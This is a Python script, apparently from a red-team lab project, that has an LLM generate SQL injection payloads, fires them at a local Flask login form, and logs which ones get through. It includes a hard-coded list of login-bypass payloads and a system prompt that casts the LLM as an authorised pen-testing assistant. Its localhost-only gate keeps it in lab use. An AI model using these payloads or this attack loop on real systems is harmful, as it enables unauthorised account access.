"""
Red AI — Automated SQL Injection Attacker Agent (Stage 2)

Uses the Nebius AI Studio API (OpenAI-compatible) to generate SQL injection
payloads, fires them at the Stage 1 target app's /login endpoint, and logs
every result to a local JSON file.

Safety: hard-restricted to 127.0.0.1 / localhost targets only.
"""

import argparse
import json
import os
import re
import sys
import time
from datetime import datetime, timezone
from urllib.parse import urlparse

import requests
from dotenv import load_dotenv
from openai import OpenAI

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
ALLOWED_HOSTS = {"127.0.0.1", "localhost"}
DEFAULT_TARGET = "http://127.0.0.1:5001"
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "attack_log.json")

# Load .env from the project root (one level up from red-ai/)
load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".env"))


def get_llm_client() -> OpenAI:
    """Initialise the Nebius AI Studio client via the OpenAI-compatible SDK."""
    api_key = os.environ.get("NEBIUS_API_KEY")
    if not api_key:
        print("ERROR: NEBIUS_API_KEY not set. Add it to ../.env or export it.")
        sys.exit(1)
    return OpenAI(
        base_url="https://api.studio.nebius.com/v1/",
        api_key=api_key,
    )


# ---------------------------------------------------------------------------
# Localhost safety gate
# ---------------------------------------------------------------------------
def validate_target(url: str) -> None:
    """Abort immediately if the target URL is not localhost."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if host not in ALLOWED_HOSTS:
        print(f"BLOCKED: Target host '{host}' is not localhost. Red AI refuses to run.")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Payload generation via LLM
# ---------------------------------------------------------------------------
SQLI_SYSTEM_PROMPT = """\
You are a penetration-testing assistant used in an authorised, isolated lab.
Your job is to produce SQL injection payloads for educational security testing.

The target is a Flask/SQLite login form at POST /login with two form fields:
  username  (text)
  password  (text)

The back-end query is:
  SELECT * FROM users WHERE username = '<username>' AND password = '<password>'

Generate exactly 8 varied SQL injection payloads. For each payload, output a
JSON object with keys "username" and "password" containing the values to send.
Return ONLY a JSON array of these objects — no explanation, no markdown fences.
"""


def generate_payloads(client: OpenAI, model: str) -> list[dict]:
    """Ask the LLM for SQL injection payloads and parse the JSON response."""
    fallback = [
        {"username": "' OR '1'='1' --", "password": "x"},
        {"username": "admin' --", "password": "x"},
        {"username": "' OR 1=1 --", "password": "x"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "' UNION SELECT 1,2,3,4 --", "password": "x"},
        {"username": "' OR ''='", "password": "' OR ''='"},
        {"username": "admin'/*", "password": "*/--"},
        {"username": "' OR username='admin' --", "password": "x"},
    ]

    try:
        resp = client.chat.completions.create(
            model=model,
            temperature=0.7,
            messages=[
                {"role": "system", "content": SQLI_SYSTEM_PROMPT},
                {"role": "user", "content": "Generate the payloads now."},
            ],
        )
        raw = resp.choices[0].message.content.strip()

        # Strip markdown fences if the model wraps the output
        raw = re.sub(r"^```(?:json)?\s*", "", raw)
        raw = re.sub(r"\s*```$", "", raw)

        payloads = json.loads(raw)
        if not isinstance(payloads, list):
            payloads = [payloads]
        return payloads

    except json.JSONDecodeError:
        print("WARNING: LLM returned non-JSON — using fallback payloads.")
        return fallback
    except Exception as e:
        print(f"WARNING: LLM call failed ({e}) — using fallback payloads.")
        return fallback


# ---------------------------------------------------------------------------
# Attack execution
# ---------------------------------------------------------------------------
SUCCESS_MARKERS = ["Welcome", "Role:"]


def fire_payload(target_url: str, payload: dict) -> dict:
    """Send a single payload to the login endpoint and classify the result."""
    login_url = f"{target_url.rstrip('/')}/login"
    ts = datetime.now(timezone.utc).isoformat()

    try:
        resp = requests.post(login_url, data=payload, timeout=5)
        body = resp.text[:500]  # keep a snippet
        success = any(marker in body for marker in SUCCESS_MARKERS)
        return {
            "timestamp": ts,
            "payload": payload,
            "status_code": resp.status_code,
            "success": success,
            "response_snippet": body,
        }
    except requests.RequestException as e:
        return {
            "timestamp": ts,
            "payload": payload,
            "status_code": None,
            "success": False,
            "response_snippet": str(e),
        }


def save_log(results: list[dict]) -> None:
    """Append results to the JSON log file."""
    existing = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            try:
                existing = json.load(f)
            except json.JSONDecodeError:
                existing = []
    existing.extend(results)
    with open(LOG_FILE, "w") as f:
        json.dump(existing, f, indent=2)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Red AI — SQL Injection Attacker")
    parser.add_argument(
        "--vuln",
        default="sql_injection",
        choices=["sql_injection"],
        help="Vulnerability type to target (default: sql_injection)",
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Base URL of the target app (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--model",
        default="nvidia/nemotron-3-super",
        help="Nebius model ID to use for payload generation",
    )
    args = parser.parse_args()

    # Safety check
    validate_target(args.target)

    print("=" * 60)
    print("  RED AI — SQL Injection Attack Agent")
    print("=" * 60)
    print(f"  Target : {args.target}")
    print(f"  Vuln   : {args.vuln}")
    print(f"  Model  : {args.model}")
    print("=" * 60)

    # 1. Generate payloads via LLM
    print("\n[1/3] Generating payloads via Nebius AI Studio...")
    client = get_llm_client()
    payloads = generate_payloads(client, args.model)
    print(f"      → {len(payloads)} payloads generated.\n")

    # 2. Fire each payload
    print("[2/3] Firing payloads at target...\n")
    results = []
    for i, payload in enumerate(payloads, 1):
        result = fire_payload(args.target, payload)
        status = "✅ SUCCESS" if result["success"] else "❌ FAILED"
        print(f"  [{i}/{len(payloads)}] {status}  →  username={payload.get('username', '')!r}")
        results.append(result)
        time.sleep(0.2)  # polite pause

    # 3. Log & summarise
    save_log(results)
    print(f"\n[3/3] Results saved to {LOG_FILE}")

    total = len(results)
    wins = [r for r in results if r["success"]]
    losses = total - len(wins)

    print("\n" + "=" * 60)
    print("  SUMMARY")
    print("=" * 60)
    print(f"  Payloads tried   : {total}")
    print(f"  Payloads SUCCESS : {len(wins)}")
    print(f"  Payloads FAILED  : {losses}")
    if wins:
        print("\n  Working payloads:")
        for w in wins:
            print(f"    • username={w['payload'].get('username', '')!r}  "
                  f"password={w['payload'].get('password', '')!r}")
    else:
        print("\n  No payloads broke through this time.")
    print("=" * 60)


if __name__ == "__main__":
    main()
